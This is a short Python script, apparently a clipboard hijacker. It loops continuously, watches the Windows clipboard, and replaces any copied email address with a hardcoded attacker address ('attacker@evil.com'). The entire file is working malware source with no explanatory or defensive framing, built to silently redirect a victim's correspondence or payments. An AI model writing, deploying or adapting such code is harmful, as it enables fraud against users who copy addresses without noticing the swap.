import win32clipboard,re
from time import sleep

attacker_email = "attacker@evil.com"
email_regex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData().rstrip()
    if (re.search(email_regex,data)):
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(attacker_email)
    win32clipboard.CloseClipboard()
    sleep(1)